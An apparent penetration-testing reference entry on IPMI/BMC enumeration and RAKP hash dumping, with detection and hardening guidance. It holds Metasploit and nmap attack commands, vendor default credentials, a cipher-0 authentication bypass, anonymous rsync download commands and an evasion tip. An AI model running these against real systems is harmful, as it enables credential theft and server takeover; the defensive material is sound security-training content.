examples.label: Dump IPMI hashes in Metasploit
examples.command:
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS 10.129.42.195
msf6 > run

notes: Default creds: Dell iDRAC root/calvin, HP iLO Administrator/<8-char random>, Supermicro ADMIN/ADMIN. Wordlists: /usr/share/metasploit-framework/data/wordlists/ipmi_{passwords,users}.txt. Port: 623/udp.

recommended.note: Crack the dumped IPMI 2.0 RAKP hash offline.

name: IPMI - Enumeration & Hash Dump
description: IPMI/BMC interfaces leak password hashes via the RAKP protocol without authentication. Scan the version, dump hashes with Metasploit, then crack them offline.

steps.label: 1. Version scan
steps.command:
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
# msf: use auxiliary/scanner/ipmi/ipmi_version; set rhosts <ip>; run

defense.why_it_works: BMCs are frequently found with unchanged default credentials (e.g., ADMIN:ADMIN, root:calvin). Beyond defaults, IPMI 2.0 has a flaw in the RAKP authentication protocol: 'during the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.' This allows retrieval of any valid user's password hash without completing authentication, then cracking it offline with Hashcat mode 7300. 'There is no direct fix to this issue because the flaw is a critical component of the IPMI specification.'
defense.prerequisites: Network access to the IPMI service (UDP 623) on a BMC.
defense.impact: BMC version and, via the IPMI 2.0 RAKP hash-disclosure flaw, crackable password hashes leading to BMC (and host) takeover.
defense.detection:
Monitor UDP port 623 for unexpected IPMI traffic. Log all BMC authentication attempts and alert on repeated failures or incomplete RAKP exchanges (hash retrieval without successful login).

[MITRE T1046 AN1583] Monitor for execution of network enumeration utilities (nmap, netcat, net.exe, ping.exe, tracert.exe) in short succession, particularly when chained with lateral movement tools or system enumeration commands. [AN1584] Sequential ping, arp, or traceroute commands issued from bash scripts or interactive shells to map remote hosts are a strong behavioral indicator.
defense.artifacts: RAKP message exchanges in BMC logs; UDP 623 traffic in network monitoring.
defense.prevention:
Change all default BMC credentials immediately after deployment. Since the RAKP hash-disclosure flaw cannot be patched at the protocol level, implement network segmentation to restrict UDP 623 access to dedicated management networks and specific administrator IPs. Use very long, complex, unique passwords for BMC accounts to resist offline dictionary attacks.

[MITRE T1046 M1042] Disable or remove unnecessary services and functionality that expose attack surface. [M1030] Implement network segmentation to limit the set of hosts reachable from any given compromised system. Use firewalls to restrict which source addresses can reach each service port.
defense.misconfiguration: Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.
defense.vulnerable_config:
# IPMI cipher 0 — no authentication required:
# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status
# Returns valid data — auth bypassed entirely

# rsync anonymous access:
# rsync --list-only rsync://<ip>/  # lists all modules without auth
# rsync rsync://<ip>/backup /tmp   # downloads backup files

# Oracle TNS — version banner reveals exact version:
# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)
defense.secure_config:
# IPMI — disable cipher 0, enable only strong ciphers:
# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)
# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)

# rsync — require auth:
# /etc/rsyncd.conf:
# [backup]
#   auth users = backupuser
#   secrets file = /etc/rsyncd.secrets
#   hosts allow = 10.10.1.0/24

# RSH/rexec — disable entirely (replaced by SSH):
systemctl disable rsh.socket rexec.socket rlogin.socket

# Oracle TNS — disable remote admin, enforce auth:
# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)
defense.evasion: The hash-retrieval flaw is a single request per BMC; avoid scanning the whole range loudly — target known BMCs.
